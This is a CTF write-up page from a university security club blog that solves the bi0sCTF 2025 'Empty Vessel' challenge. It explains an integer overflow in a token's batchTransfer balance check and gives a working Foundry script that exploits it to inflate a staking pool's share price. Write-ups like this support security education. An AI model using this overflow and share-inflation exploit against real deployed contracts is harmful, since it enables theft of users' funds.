@@ -1,0 +1,75 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Empty Vessel</title><meta content="Empty Vessel" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Empty-Vessel/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Empty Vessel" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Empty-Vessel/ property=twitter:url><meta content="Empty Vessel" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/Empty-Vessel/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>Empty-Vessel</span></div><time datetime=2025-07-07>Published on: <span class=accent-data>2025-07-07</span></time><address rel=author>By <span class=accent-data> Anirud, and exploiitm </span></address><h1>Empty Vessel</h1><h2 id=description>Description</h2><p>When you speak directly to metal, metal doesn’t lie… but it doesn’t think either.<h2 id=solution>Solution</h2><h3 id=goal>Goal</h3><pre class=language-solidity data-lang=solidity style=background:#282828;color:#fdf4c1aa><code class=language-solidity data-lang=solidity><span>function solve()external{
+</span><span>        if(!staked){
+</span><span>            revert Setup__Not__Yet__Staked();
+</span><span>        }
+</span><span>        uint256 assetsReceived=stake.redeemAll(address(this),address(this));
+</span><span>        if(assetsReceived>75_000 ether){
+</span><span>            revert Setup__Chall__Unsolved();
+</span><span>        }
+</span><span>        solved=true;
+</span><span>    }
+</span><span>
+</span><span>    function isSolved()public view returns (bool){
+</span><span>        return solved;
+</span><span>    }
+</span></code></pre><p>When we call solve, redeemAll function is called, and the challenge is complete if less than 75000 ether is received. The goal is to inflate the share value such that less than 75000 ether worth of shares are minted when 100000 ether is staked.<h3 id=vulnerability>Vulnerability</h3><pre class=language-solidity data-lang=solidity style=background:#282828;color:#fdf4c1aa><code class=language-solidity data-lang=solidity><span>function batchTransfer(address[] memory receivers,uint256 amount)public returns (bool){
+</span><span>// ...
+</span><span>    if lt(mload(ptr),mul(mload(receivers),amount)){ // exploit here since this is vulnerable to integer overflow during balance check
+</span><span>                    mstore(add(ptr,0x20),0xcf479181)
+</span><span>                    mstore(add(ptr,0x40),mload(ptr))
+</span><span>                    mstore(add(ptr,0x60),mul(mload(receivers),amount))
+</span><span>                    revert(add(add(ptr,0x20),0x1c),0x44)
+</span><span>                }
+</span><span>                
+</span><span>                for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}{
+</span><span>                    mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))
+</span><span>                    mstore(add(ptr,0x20),1)
+</span><span>                    sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))
+</span><span>                }
+</span><span>// ...
+</span><span>}
+</span></code></pre><p>The function is vulnerable to overflow attacks that allows bypassing balance checks. This means you can transfer very large amounts.<h3 id=exploit-strategy>Exploit Strategy</h3><p>Read the setup contract to understand that the player can claim 1.746 Billion INR tokens to begin with, and the stakeAmount is 100000 ether. We must exploit the batchTransfer function to increase our token holdings, gain ownership of the pool, and then transfer a significant amount to inflate the pool.<pre class=language-solidity data-lang=solidity style=background:#282828;color:#fdf4c1aa><code class=language-solidity data-lang=solidity><span>pragma solidity ^0.8.20;
+</span><span>
+</span><span>import {Script, console} from "forge-std/Script.sol";
+</span><span>import {Setup, Stake, INR} from "src/Setup.sol";
+</span><span>
+</span><span>contract Solve is Script {
+</span><span>    function run() external {
+</span><span>        // Replace with the setup instance address given to you
+</span><span>        address setupAddr = ; // Add received setup address after creating an instance
+</span><span>
+</span><span> vm.startBroadcast();
+</span><span>        Setup setup = Setup(setupAddr);
+</span><span>        INR inr = setup.inr();
+</span><span>        Stake stake = setup.stake();
+</span><span> address player = msg.sender;
+</span><span> 
+</span><span> // Claim INR tokens (gives 1.74B tokens)
+</span><span>        setup.claim();
+</span><span>        inr.approve(address(stake), type(uint256).max);
+</span><span>        
+</span><span> // Addresses for inflation attack using batchTransfer
+</span><span>        address[] memory receivers = new address[](2);
+</span><span> receivers[0] = player;
+</span><span>        receivers[1] = address(0);
+</span><span>
+</span><span> // Transfer large unchecked value to self to later inflate pool
+</span><span>        inr.batchTransfer(receivers, 0x8000000000000000000000000000000000000000000000000000000000000000);
+</span><span>
+</span><span> // Establish ownership in the pool by depositting just 1 INR
+</span><span>        stake.deposit(1, player);
+</span><span>        // Manually transfer 50k INR to the stake pool (inflate it)
+</span><span>        inr.transfer(address(stake), 50_000 ether);
+</span><span>
+</span><span>        // Now make Setup stake its 100k INR - this generates fewer shares due to inflated share value
+</span><span>        setup.stakeINR();
+</span><span>
+</span><span>        setup.solve();
+</span><span>        // Assert and log result
+</span><span>        require(setup.isSolved(), "Exploit failed");
+</span><span>        console.log("Challenge Solved!");
+</span><span>
+</span><span>        vm.stopBroadcast();
+</span><span>    }
+</span><span>}
+</span></code></pre><p>We transfer 50000 ether (or more) into the pool, which increases share value, and when stakeINR stakes 100000 ether, it receives lesser shares than expected (since the pool is inflated). Finally when solve is called, the shares are liquidated at fair value, and we receive lesser tokens than we deposited.<p>Flag: <code>bi0sctf{tx:0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f}</code><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
